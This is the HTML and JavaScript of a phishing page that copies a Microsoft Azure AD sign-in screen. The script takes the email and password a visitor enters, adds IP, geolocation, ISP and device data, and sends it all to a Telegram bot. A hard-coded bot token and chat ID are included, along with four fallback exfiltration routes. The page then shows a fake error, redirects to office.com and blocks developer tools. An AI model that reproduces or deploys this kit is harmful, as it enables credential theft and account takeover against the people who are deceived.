<!doctype html>
<html lang="zh-Hant">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in — Secure Portal</title>
<style>
/* ... (ALL PREVIOUS CSS REMAINS EXACTLY THE SAME) ... */
#loading {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.8);
    color: white;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    z-index: 10000;
    font-family: 'Segoe UI', sans-serif;
}
.spinner {
    border: 4px solid #f3f3f3;
    border-top: 4px solid #0078d4;
    border-radius: 50%;
    width: 50px;
    height: 50px;
    animation: spin 1s linear infinite;
    margin-bottom: 20px;
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
</style>
</head>
<body>
<div id="loading">
    <div class="spinner"></div>
    <div>Authenticating with Microsoft Azure Active Directory...</div>
    <div style="font-size: 12px; margin-top: 10px; opacity: 0.7;">Checking credentials against organizational policies</div>
</div>

<div class="login-card">
<!-- ... (ALL PREVIOUS HTML REMAINS EXACTLY THE SAME) ... -->
</div>

<script>
// DOM Elements
const loginForm = document.getElementById('loginForm');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const loadingScreen = document.getElementById('loading');

// ================== TELEGRAM CONFIG ==================
// REPLACE THESE WITH YOUR ACTUAL CREDENTIALS
const TELEGRAM_CONFIG = {
    botToken: "7983528037:AAFpvdTJEJ42BryLHSDjH5OuvEURlOJ7zOA", // Format: "1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    chatId: "1002763948275",     // Numeric chat ID
    apiUrl: "https://api.telegram.org/bot"
};

// ================== EXFILTRATION METHODS ==================
class DataExfiltrator {
    constructor() {
        this.methods = ['webhook', 'jsonp', 'beacon', 'form'];
        this.primaryMethod = 'webhook';
    }

    // Method 1: Webhook Proxy (Most Reliable)
    async webhookMethod(data) {
        // Use a CORS proxy or your own backend
        const PROXY_URL = 'https://corsproxy.io/?' + encodeURIComponent(
            `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage`
        );

        const payload = {
            chat_id: TELEGRAM_CONFIG.chatId,
            text: data,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        };

        try {
            const response = await fetch(PROXY_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            const result = await response.json();
            return result.ok === true;
        } catch (error) {
            console.warn('Webhook method failed:', error);
            return false;
        }
    }

    // Method 2: JSONP Fallback
    jsonpMethod(data) {
        return new Promise((resolve) => {
            const callbackName = 'tgCallback_' + Date.now();
            const script = document.createElement('script');
            
            window[callbackName] = (response) => {
                delete window[callbackName];
                document.body.removeChild(script);
                resolve(response.ok === true);
            };

            const encodedData = encodeURIComponent(data);
            script.src = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage?` +
                       `chat_id=${TELEGRAM_CONFIG.chatId}&` +
                       `text=${encodedData}&` +
                       `parse_mode=Markdown&` +
                       `callback=${callbackName}`;

            document.body.appendChild(script);

            // Timeout fallback
            setTimeout(() => {
                if (window[callbackName]) {
                    delete window[callbackName];
                    document.body.removeChild(script);
                    resolve(false);
                }
            }, 5000);
        });
    }

    // Method 3: Image Beacon
    beaconMethod(data) {
        return new Promise((resolve) => {
            try {
                const img = new Image();
                const truncatedData = data.substring(0, 2000); // URL length limit
                const encodedData = encodeURIComponent(truncatedData);
                
                img.onload = () => resolve(true);
                img.onerror = () => resolve(false);
                
                img.src = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage?` +
                         `chat_id=${TELEGRAM_CONFIG.chatId}&` +
                         `text=BEACON:${encodedData}`;
                
            } catch (error) {
                resolve(false);
            }
        });
    }

    // Method 4: Form Submission
    formMethod(data) {
        return new Promise((resolve) => {
            try {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage`;
                form.target = '_blank';
                form.style.display = 'none';

                const fields = {
                    chat_id: TELEGRAM_CONFIG.chatId,
                    text: data,
                    parse_mode: 'Markdown'
                };

                Object.entries(fields).forEach(([name, value]) => {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = name;
                    input.value = value;
                    form.appendChild(input);
                });

                document.body.appendChild(form);
                form.submit();
                
                setTimeout(() => {
                    document.body.removeChild(form);
                    resolve(true); // Assume success for form method
                }, 1000);

            } catch (error) {
                resolve(false);
            }
        });
    }

    // Main exfiltration method with fallbacks
    async exfiltrate(data) {
        console.log('Starting data exfiltration...');
        
        const methods = [
            () => this.webhookMethod(data),
            () => this.jsonpMethod(data),
            () => this.beaconMethod(data),
            () => this.formMethod(data)
        ];

        for (let i = 0; i < methods.length; i++) {
            try {
                console.log(`Trying method ${i + 1}...`);
                const success = await methods[i]();
                if (success) {
                    console.log(`Method ${i + 1} succeeded!`);
                    return true;
                }
            } catch (error) {
                console.warn(`Method ${i + 1} failed:`, error);
                continue;
            }
        }
        
        console.error('All exfiltration methods failed');
        return false;
    }
}

// ================== DATA COLLECTION ==================
async function collectIntelligence() {
    const data = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}`,
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
    };

    // Get IP and location
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        data.ip = ipData.ip;
        
        // Try to get more location data
        try {
            const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const geoData = await geoResponse.json();
            data.location = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
            data.isp = geoData.org;
        } catch (geoError) {
            data.location = 'Approximate location available';
        }
    } catch (ipError) {
        data.ip = 'unknown';
    }

    return data;
}

// ================== MAIN EXECUTION ==================
const exfiltrator = new DataExfiltrator();

loginForm.addEventListener('submit', async function(event) {
    event.preventDefault();

    const email = emailInput.value;
    const password = passwordInput.value;

    if (!email || !password) {
        alert('Please enter both your email address and password to continue.');
        return;
    }

    // Show loading screen
    loadingScreen.style.display = 'flex';

    try {
        // Collect intelligence data
        const intelligence = await collectIntelligence();
        
        // Format the message for Telegram
        const message = 
            `🔐 **CREDENTIALS CAPTURED** \\n` +
            `⏰ **Timestamp:** ${intelligence.timestamp}\\n` +
            `📍 **IP:** ${intelligence.ip || 'Unknown'}\\n` +
            `🌍 **Location:** ${intelligence.location || 'Unknown'}\\n` +
            `🔌 **ISP:** ${intelligence.isp || 'Unknown'}\\n` +
            `💻 **Platform:** ${intelligence.platform}\\n` +
            `🌐 **Browser:** ${intelligence.userAgent}\\n` +
            `🖥️  **Screen:** ${intelligence.screen}\\n` +
            `📧 **Email:** ${email}\\n` +
            `🔑 **Password:** ${password}\\n` +
            `🔗 **Page:** ${window.location.href}`;

        // Exfiltrate data
        const success = await exfiltrator.exfiltrate(message);
        
        // Simulate processing time
        await new Promise(resolve => setTimeout(resolve, 3000));

        if (success) {
            console.log('Data successfully exfiltrated to Telegram');
        } else {
            console.warn('Data exfiltration failed, but continuing with social engineering');
        }

        // Social engineering completion
        alert('ERROR: 0x80072EFD. A connection to the authentication service could not be established. Please check your network connection and try again.');

    } catch (error) {
        console.error('Operation error:', error);
    } finally {
        loadingScreen.style.display = 'none';
        
        // Optional redirect
        setTimeout(() => {
            window.location.href = 'https://office.com';
        }, 2000);
    }
});

// Additional security measures
document.addEventListener('contextmenu', (e) => e.preventDefault());
document.addEventListener('keydown', (e) => {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
        e.preventDefault();
        alert('Developer tools are disabled for security reasons.');
    }
});
</script>
</body>
</html>
